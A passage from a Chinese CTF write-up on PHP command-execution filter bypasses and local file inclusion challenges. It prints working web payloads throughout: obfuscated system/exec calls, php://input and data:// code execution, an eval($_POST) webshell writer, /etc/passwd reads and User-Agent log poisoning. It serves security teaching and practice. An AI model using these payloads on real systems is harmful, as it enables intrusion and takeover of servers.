hexdec(bin2hex(&quot;_GET&quot;));  //1598506324</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo base_convert(&quot;8d3746fcf&quot;, 16, 36)(dechex(&quot;1598506324&quot;));  // 绕过过滤拿到 &quot;_GET&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat flag.php</span><br><span class="line"></span><br><span class="line">$$pi&#123;abs&#125;($$pi&#123;acos&#125;)  #相当于 $_GET[&#x27;abs&#x27;]($_GET[&#x27;acos&#x27;])</span><br><span class="line">--- ?c=_GET;$_GET[&#x27;abs&#x27;]($_GET[&#x27;acos&#x27;])&amp;abs=system&amp;acos=cat flag.php   ---system(&#x27;cat flag.php&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web124.png"></p><p>有很多解法，还可以 getallheaders 利用请求头传语句</p><p>长度限制 80 是很容易超长的，何况还有白名单函数的限制，不能直接输入 <code>cat</code> 等命令，而我们可以利用 <code>getallheaders</code> 这个函数，把命令放在请求头来拼接语句。</p><p>函数解释：</p><blockquote><p>getallheaders ( void   ) : array</p><p>获取全部 HTTP 请求头信息。</p></blockquote><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copy<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">3</span>&#125;)</span><br><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) -&gt; exec</span><br><span class="line">base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) -&gt; getallheaders</span><br><span class="line"> ---exec(getallheaders()&#123;<span class="number">3</span>&#125;)</span><br></pre></td></tr></table></figure><p>在报文头中相应属性，值为要执行的命令：例如上面的命令我们需要在请求头添加 <code>3: cat flag.php</code></p><p><strong>注意：数据包结构要正确，请求头与请求体之间必须要有空行；如果没有请求体，那么需要用至少一行空行替代，代表请求体为空，否则是无法请求成功的。像这样↓</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web124-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web124-2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web124-4.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web124-5.png"></p><p>以下为错误的请求包格式</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web124-3.png"></p><p>​      </p><h2 id="文件包含-78-117"><a href="#文件包含-78-117" class="headerlink" title="文件包含(78-117)"></a>文件包含(78-117)</h2><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>include():找不到被包含的文件只会产生警告，脚本继续执行<br>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p><p>PHP文件包含伪协议</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web78-2.png"></p><p>稍微介绍这些协议： <a href="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/php%E4%BC%AA%E5%8D%8F%E8%AE%AE.html">php伪协议.html</a> </p><p>1.file:// 协议:</p><blockquote><p>用于访问本地的文件系统，<em>文件系统</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， <code>include_path</code> 会可选地搜索，也作为相对的路径。</p><p>不受allow_url_fopen，allow_url_include 影响<br>file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br>file:// [文件的绝对路径和文件名]</p><ul><li>/path/to/file.ext</li><li>relative/path/to/file.ext</li><li>fileInCwd.ext</li><li>C:/path/to/winfile.ext</li><li>C:\path\to\winfile.ext</li><li>\smbserver\share\path\to\winfile.ext</li><li>file:///path/to/file.ext</li></ul><p>例如：<code>http://www.xx.com?file=file:///etc/passsword</code><br>           <code>http://www.xx.com?file=file://../../../../etc/passsword</code><br>           <code>http://www.xx.com?file=file://C:/windows/Temp/flag.txt</code></p></blockquote><p>2.php:// 协议</p><blockquote><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器<br>php:// 可以用于访问各个输入/输出流（I/O streams）</p><p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p><p>在CTF中常用<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码</p><p>1.php://filter<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web78-3.png"></p><p><strong>PHP.ini配置要求</strong>：<br>php://filter在双off的情况下也可以正常使用；<br>allow_url_fopen ：off/on<br>allow_url_include：off/on<br>通常用于读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了<br>例如：<code>?file=php://filter/read/convert.base64-encode/resource=flag.php</code>不知道为什么这样也行<br>           <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br>            ?file=php://filter/读方式=编码/资源=资源名</p><p>2.php://input</p><p>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。<br><strong>PHP.ini配置要求</strong>：<br>allow_url_fopen ：off/on<br>allow_url_include：on<br>通常用于POST执行代码或者写入木马<br>例如：<code>http://127.0.0.1/cmd.php?file=php://input</code><br>[POST DATA] 内容为<code>&lt;?php phpinfo()?&gt;</code></p><p>也可以POST如下内容生成一句话： <code>&lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt;</code><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web78-4.png"></p></blockquote><p>3.data:// 协议</p><blockquote><p>这是一个数据流封装器经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件</p><p><strong>PHP.ini配置要求：</strong><br>data://协议必须双在on才能正常使用；<br>allow_url_fopen ：on<br>allow_url_include：on</p><p>该协议会将输入的代码执行<br>data://text/plain,xxxx(要执行的php代码)<br>data://text/plain;base64,xxxx(base64编码后的数据)</p><p>data协议 php5.2.0起，数据流封装器开始有效<br>data伪协议的一些格式：</p><pre><code>  data://,&lt;文本数据&gt;  data://text/plain,&lt;文本数据&gt;  data://text/html,&lt;html代码&gt;  data://text/css,&lt;CSS代码&gt;  data://text/javascript,&lt;js代码&gt;  data://text/gif;base64,&lt;base64编码的gif图片数据&gt;    协议里的双斜杠 // 可以去掉</code></pre><p><code>http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</code><br>or<br><code>http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code><br>也可以：<br><code>http://127.0.0.1/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</code><br>or<br><code>http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web78-5.png"></p></blockquote><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>未发现过滤，直接读取读不到flag，使用伪协议读取，利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web78-1.png"></p><p>解码一下base64</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web78.png"></p><p>​      </p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了php字符，出现会被???替代。PHP伪协议可以大小写绕过，flag.php可以按照flag.*去查找。那我们使用php://input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=Php://input</span><br><span class="line">[post data]为 &lt;?php system(&quot;tac flag.php&quot;);?&gt;  ---使用cat可能使PHP文件执行而不显示，tac反向输出破坏lphp语句，可以输出</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web79-1.png"></p><p>不知道为什么绿色的hackbar不行，黑色的才行</p><p>使用data://协议读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,&lt;?php system(cat flag.php);?&gt; ---命令代码需要base64一下</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure><p>右键源码里找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web79.png"></p><p>​      </p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了一个过滤，本以为可以直接使用上一把payload，结果发现不行。不应该啊，应该是文件名改了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web80.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web80-1.png"></p><p>​      </p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了冒号，试了一些编码也无法绕过。题目提示”包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log”</p><p>日志文件，那么抓包写马咯</p><p>首先看日志都会记录些什么，一眼很明显的 User-Agent</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81.png"></p><p>抓包，写马</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-1.png"></p><p>蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-2.png"></p><p>找flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-3.png"></p><hr><p>既然能执行php代码，那么还可以直接在UA头插入<code>&lt;?php system(&#39;cat fl0g.php&#39;);?&gt;</code>,放包后访问日志文件，源码里就可以找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-4.png"></p><hr><p>还可以这样，先 GET 传马， 后 POST 利用马</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-7.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-8.png"></p><hr><p>还可以直接使用$_REQUEST，不用转请求方式啦</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-9.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-10.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web81-11.png"></p><p>​      </p><h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了php而且不区分大小写，那我们使用 data:// 协议</p><p>因为base64编码后有=，我们去掉=不要影响代码执行效果</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web88.png"></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web88-1.png"></p><p>读取flag</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web88-3.png"></p><p>​      </p><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>题目提示为misc+LFI，打开网站是一个视频</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web116-1.png"></p><p>首先我们要先找到源码，随手包含一下 /var/www/html</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web116.png"></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了base64字符串等</p><p>因为是本地文件包含，我们直接用 file://包含flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web116-2.png"></p><p>​      </p><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span 